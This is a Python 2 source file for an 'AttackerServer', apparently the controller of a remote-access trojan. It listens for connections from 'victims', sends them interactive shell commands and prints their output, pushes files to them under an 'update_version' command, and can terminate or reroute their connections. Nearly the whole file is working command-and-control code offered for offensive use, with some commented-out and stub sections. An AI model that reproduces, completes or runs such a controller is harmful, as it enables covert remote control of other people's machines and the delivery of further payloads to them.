import socket
import select
import msvcrt
import os
import sys
from threading import Thread
from time import sleep

SERVER_IP = '127.0.0.1'
SERVER_PORT = 2005
PORT_INDEX = 1
SOCKET_RECV_BYTES = 1024
SOCKET_LISTEN = 5
KEY_ENTER = 13
KEY_BACKSPACE = 8


class AttackerServer:
    def __init__(self):
        self.server_socket = None
        self.open_client_sockets = []
        self.messages_to_send = []
        self.action_message = []
        self.mode = None
        self.msg = ''
        self.victim_list = []
        self.command_dict = {
            0: self.terminate,
            1: self.show_victim,
            2: self.cmd,
            3: self.open_socket,
            4: self.update_version,
            5: self.change_socket
        }

    def update_version(self, client_socket, command_message):
        list_arg = command_message.split(';')
        client_socket.send(
            "{commnd_code};{file_size}".format(commnd_code=list_arg[0], file_size=os.path.getsize(list_arg[1])))
        with open(list_arg[1], 'rb') as file_to_send:
            bytes_to_send = file_to_send.read(SOCKET_RECV_BYTES)
            while bytes_to_send:
                client_socket.send(bytes_to_send)
                print 'Sent ', repr(bytes_to_send)
                bytes_to_send = file_to_send.read(SOCKET_RECV_BYTES)

        client_socket.send('')
        print("done")

    def get_socket_str(self, client_socket):
        return client_socket.getpeername()[0] + ':' + str(client_socket.getpeername()[1])

    def show_victim(self, client_socket, command_message):
        print self.get_socket_str(client_socket)
        # for i, victim in enumerate(self.victim_list):
        #     print i, ')', self.get_socket_str(victim)

    def terminate(self, client_socket, params):
        client_socket.send('0')

    def cmd(self, client_socket, command_message):
        client_socket.send('2')
        prompt_str = self.get_socket_str(client_socket)

        print 'cmd mode'

        while True:
            try:
                command = raw_input(prompt_str + ">")
                if len(command.split()) != 0:
                    client_socket.send(command)
                else:
                    continue
            except EOFError:
                print("Invalid input, type 'help' to get a list of implemented commands.\n")
                continue

            if command == "quit":
                break

            data = client_socket.recv(SOCKET_RECV_BYTES)
            print(data + "\n")

        print 'quit cmd mode'

    def open_socket(self, client_socket, command_message):
        client_socket.send(command_message)

    def change_socket(self, client_socket, command_message):
        client_socket.send(command_message)

    def decryption(self, message):
        return message

    def get_command_id(self, command_msg):
        return int(command_msg.split(';')[0])

    def handle_victims_connections(self):

        while True:
            rlist, wlist, xlist = select.select([self.server_socket] + self.open_client_sockets,
                                                self.open_client_sockets, [])
            self.victim_list = wlist
            for current_socket in rlist:
                # server socket case -> new client
                if current_socket is self.server_socket:
                    (new_socket, address) = self.server_socket.accept()
                    # print 'New victim {0} !'.format(address)
                    self.open_client_sockets.append(new_socket)
                # client socket case -> existing client
                else:
                    try:
                        print '.....New data from client.....'
                        data = current_socket.recv(SOCKET_RECV_BYTES)
                        if data == "":
                            self.open_client_sockets.remove(current_socket)
                            print "Connection with client closed."
                        else:
                            print (current_socket, data)

                    except Exception as e:
                        if current_socket in self.open_client_sockets:
                            self.open_client_sockets.remove(current_socket)
                        print 'Exception occurred in receive: ', e

    def handle_attacker_command(self):
        while True:
            command_message = raw_input('attacker$')

            if command_message == '':
                continue

            command_id = self.get_command_id(command_message)
            print 'command_id ', command_id

            if command_id in self.command_dict:
                for victim in self.victim_list:
                    print 'victim: (', self.get_socket_str(victim), '), command: ', command_message
                    self.command_dict[command_id](victim, command_message)

                    # else:    ??????????
                    #     for wsocket in victim_list:
                    #         print '[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], self.action_message)
                    #         wsocket.send(command_message)
                    # wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))



                    # if msvcrt.kbhit():  # if the client typed character
                    #     char = msvcrt.getch()  # get this character
                    #     self.msg += char
                    #     sys.stdout.write(char)
                    #     sys.stdout.flush()
                    #
                    #     if chr(KEY_ENTER) is char:  # if enter
                    #         self.msg = ''
                    #         command_message = ''.join(self.action_message)
                    #         print '[Attacker]', command_message
                    #         command_id = self.get_command_id(command_message)
                    #         if command_id in self.command_dict:
                    #             self.command_dict[command_id](victim_list[0], command_message)
                    #         else:
                    #             for wsocket in victim_list:
                    #                 print '[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], self.action_message)
                    #                 wsocket.send(command_message)
                    #                 # wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))
                    #
                    #         del self.action_message[:]  # clean array
                    #
                    #     elif ord(char) == KEY_BACKSPACE:  # backspace
                    #         self.action_message.pop()
                    #
                    #     else:
                    #         # else just append the character to the message
                    #         self.action_message.append(char)

    def start(self):
        try:
            self.server_socket = socket.socket()
            self.server_socket.bind((SERVER_IP, SERVER_PORT))
            self.server_socket.listen(SOCKET_LISTEN)
            print 'server({}) is up. listening in port {}'.format(SERVER_IP, SERVER_PORT)

            t1 = Thread(target=self.handle_victims_connections)
            t2 = Thread(target=self.handle_attacker_command)
            t1.start()
            t2.start()
            t1.join()
            t2.join()

        except Exception as e:
            print 'Exception occurred: ', e
        finally:
            self.server_socket.close()
            print 'server connection is closed'


if __name__ == "__main__":
    AttackerServer().start()
